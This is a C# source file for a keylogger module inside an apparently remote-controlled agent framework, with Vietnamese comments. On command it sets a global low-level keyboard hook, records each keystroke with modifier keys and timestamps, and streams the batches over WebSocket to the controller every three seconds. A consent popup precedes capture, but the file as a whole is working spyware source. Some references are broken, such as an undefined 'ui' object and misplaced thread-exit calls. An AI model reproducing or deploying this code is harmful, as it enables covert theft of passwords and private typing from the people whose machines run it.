
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using AgentSystem.Core;
using Timer = System.Threading.Timer;

namespace AgentSystem.Modules
{
    public class KeyloggerModule : BaseModule
    {
        // Trạng thái hoạt động
        private bool isLogging = false;
        private string activeCommandId = string.Empty;

        // Quản lý Buffer & Đa luồng
        private readonly List<object> keyBuffer = new List<object>();
        private readonly object bufferLock = new object();
        private Timer flushTimer;

        // --- WIN32 API CHO LOW-LEVEL HOOK ---
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private LowLevelKeyboardProc hookProc; // Phải giữ reference để GC không dọn dẹp
        private IntPtr hookId = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetAsyncKeyState(int keyCode);

        public KeyloggerModule(AgentClient context) : base(context)
        {
            hookProc = HookCallback; // Khởi tạo delegate
        }

        public override void Execute(string action, JsonElement parameters, string commandId)
        {
            if (action == "keylog_start")
            {
                StartLogging(commandId);
            }
            else if (action == "keylog_stop")
            {
                StopLogging(commandId);
            }
        }
        private Thread hookThread; // Thêm biến toàn cục trong class

        private void StartLogging(string commandId)
        {
            if (isLogging) return;
            bool isApproved = ui.ShowConsentPopup("keylogger", 30000); 
            if (!isApproved) { /* Xử lý denied */ return; }

            activeCommandId = commandId;
            isLogging = true;

            // Khởi tạo Hook trong một luồng STA riêng biệt có Message Loop
            hookThread = new Thread(() =>
            {
                hookId = SetHook(hookProc);
                Application.Run(); // Bắt buộc: Giữ luồng sống để bắt sự kiện phím
            });
            hookThread.SetApartmentState(ApartmentState.STA);
            hookThread.Start();

            context.SendResponse(new { type = "keylog_started", agent_id = context.AgentId, command_id = commandId });
            flushTimer = new System.Threading.Timer(FlushBuffer, null, 3000, 3000);
        }

        private void StopLogging(string commandId)
        {
            if (!isLogging) return;
            flushTimer?.Dispose();
            UnhookWindowsHookEx(hookId);

            // Tắt Message Loop của luồng Hook
            Application.ExitThread(); 

            isLogging = false;
            FlushBuffer(null);
            context.SendResponse(new { type = "keylog_stopped", agent_id = context.AgentId, command_id = commandId });
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                var mainModule = curProcess.MainModule;
                if (mainModule == null)
                {
                    return IntPtr.Zero;
                }

                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(mainModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Bắt sự kiện phím nhấn xuống
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Đọc trạng thái các phím bổ trợ (Modifier keys)
                bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
                bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;  // VK_CONTROL
                bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;   // VK_MENU (Alt)

                // Cấu trúc đối tượng theo đặc tả JSON
                var keyEvent = new
                {
                    key = ((ConsoleKey)vkCode).ToString(), // Chuyển VK Code sang chữ
                    ctrl = isCtrl,
                    alt = isAlt,
                    shift = isShift,
                    timestamp_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                };

                // Đưa vào bộ đệm (Khóa lock để an toàn đa luồng)
                lock (bufferLock)
                {
                    keyBuffer.Add(keyEvent);
                }
            }

            // Trả điều khiển cho hệ điều hành, CHỚ QUÊN dòng này nếu không muốn liệt bàn phím
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private void FlushBuffer(object state)
        {
            List<object> batchToSend;

            // Khóa luồng chỉ để rút dữ liệu ra, giải phóng khóa thật nhanh
            lock (bufferLock)
            {
                if (keyBuffer.Count == 0) return;

                // Sao chép sang mảng mới và dọn dẹp mảng cũ
                batchToSend = new List<object>(keyBuffer);
                keyBuffer.Clear();
            }

            // Gửi dữ liệu qua WebSocket
            context.SendResponse(new
            {
                type = "keylog",
                command_id = activeCommandId,
                events = batchToSend
            });
        }
    }
}